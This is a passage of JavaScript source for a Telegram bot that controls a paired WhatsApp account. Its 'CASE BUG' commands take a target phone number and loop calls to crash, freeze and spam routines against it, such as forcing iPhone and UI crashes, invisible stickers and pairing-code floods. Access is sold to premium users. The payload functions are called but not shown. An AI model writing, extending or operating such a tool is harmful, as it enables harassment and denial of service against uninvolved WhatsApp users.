    Markup.button.callback('𝗧𝗔𝗞𝗔𝗠𝗨𝗥𝗔 𝗕𝗨𝗚 🦠', 'bugoption'),
  ],
  [
    Markup.button.callback('𝗖𝗢𝗡𝗧𝗥𝗢𝗟 𝗧𝗔𝗞𝗔𝗠𝗨𝗥𝗔 🛠️', 'owneroption'),
  ],
  [
    Markup.button.url('𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥', 't.me/kyanzz11'),
    Markup.button.url('𝗢𝗪𝗡𝗘𝗥', 't.me/danji27'),
   ],
]);
  const caption = `
\`\`\`DHEATLESS - EMPIRE!\n
ⓘ こんにちは。@kyanzz11 によって作成された Dheatless ボットです。お手伝いさせていただきます。

スクリプト情報 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧-
⌦ Dev: @kyanzz11
⌦ Owner: @danji27
⌦ Version: 3.0
⌦ Online: ${waktuRunPanel}

下のボタンを押してメニューを選択してください。
─────────────────────────────
Press Button Down Here to Show Menu.
\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

 //====( CASE BUG )=====//
 bot.command("forcex", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /forcex 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`TARGET: ${target}\nSTATUS: PROCESS 🔄`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  await sleep(2000);

// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`TARGET: ${target}\nSTATUS: SUCCESS ✅\nREVERSED BY TAKAMURA`,{ parse_mode: "Markdown" });

    for (let i = 0; i < 30; i++) {
      await VampFCNew(target, slide);
      await new Promise((resolve) => setTimeout(resolve, 1500));
      await CsmXForce(target);
      await new Promise((resolve) => setTimeout(resolve, 1500));
    }
    
});
 
 bot.command("forceiphone", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /forceiphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`TARGET: ${target}\nSTATUS: PROCESS 🔄`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

await sleep(2000);

// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`TARGET: ${target}\nSTATUS: SUCCESS ✅\nREVERSED BY TAKAMURA`,{ parse_mode: "Markdown" });

    for (let i = 0; i < 20; i++) {
      await VampCrashFCIphone(target);
      await new Promise((resolve) => setTimeout(resolve, 1500));
    }
    
});
 
 bot.command("crashui", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashui 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`TARGET: ${target}\nSTATUS: PROCESS 🔄`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

await sleep(2000);

// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`TARGET: ${target}\nSTATUS: SUCCESS ✅\nREVERSED BY TAKAMURA`,{ parse_mode: "Markdown" });

    for (let i = 0; i < 20; i++) {
      await Crashmaklu(CsmX, target);
      await new Promise((resolve) => setTimeout(resolve, 1500));
      await SystemUi(CsmX, target);
      await new Promise((resolve) => setTimeout(resolve, 1500));
      await uicrash(CsmX, target);
      await new Promise((resolve) => setTimeout(resolve, 1500));
    }
    
});

bot.command("xdelay", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /xdelay 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`TARGET: ${target}\nSTATUS: PROCESS 🔄`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

   await sleep(2000);

// Hapus pesan proses
  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`TARGET: ${target}\nSTATUS: SUCCESS ✅\nREVERSED BY TAKAMURA`,{ parse_mode: "Markdown" });

    for (let i = 0; i < 111; i++) {
      await InvisibleStc(CsmX, target);
      await new Promise((resolve) => setTimeout(resolve, 200));
    }
    
});

bot.command("spampair", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /spampair 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`TARGET: ${target}\nSTATUS: PROCESS 🔄`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

await sleep(2000);

await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`TARGET: ${target}\nSTATUS: SUCCESS ✅\nREVERSED BY TAKAMURA`,{ parse_mode: "Markdown" });

    for (let i = 0; i < 25; i++) {
      await SpamPair(target)
      await new Promise((resolve) => setTimeout(resolve, 100));
    }
  
});

bot.command("forcedelete", checkWhatsAppConnection, checkPremium, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /forcedelete 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const processMessage = await ctx.reply(`TARGET: ${target}\nSTATUS: PROCESS 🔄`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

await sleep(2000);

await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  // Kirim pesan proses selesai
  await ctx.reply(`TARGET: ${target}\nSTATUS: SUCCESS ✅\nREVERSED BY TAKAMURA`,{ parse_mode: "Markdown" });

    for (let i = 0; i < 25; i++) {
      await FcUiFlows(CsmX, target);
      await new Promise((resolve) => setTimeout(resolve, 1500));
    }
  
});

//====={ ENDS CASE BUG }=====


// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Anda adalah pengguna Prem`);
    } else {
        return ctx.reply(`❌ Anda bukan pengguna Prem`);
    }
});

// Command untuk pairing WhatsApp
bot.command("reqpair", async (ctx) => {
    if (!CSMX_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /pairing <nomor_wa>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');


    if (CsmX && CsmX.user) {
        return await ctx.reply("WhatsApp sudah terhubung. Tidak perlu pairing lagi.\nJika tidak terhubung silahkan hapus folder sessions di panel ya kak ><");
    }

    try {
        const code = await CsmX.requestPairingCode(phoneNumber, "DHEATLES");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
\`\`\`
✅𝗦𝘂𝗰𝗰𝗲𝘀𝘀
𝗞𝗼𝗱𝗲 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗔𝗻𝗱𝗮

𝗡𝗼𝗺𝗼𝗿: ${phoneNumber}
𝗞𝗼𝗱𝗲: ${formattedCode}\`\`\`
`;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};



// Command untuk restart
bot.command('restart', async (ctx) => {
  if (!CSMX_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }
    
  const userId = ctx.from.id.toString();
  ctx.reply('Merestart bot...');
  restartBot();
});

(async () => {
    console.log("🚀 Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses connected");
    bot.launch();
    
    })();
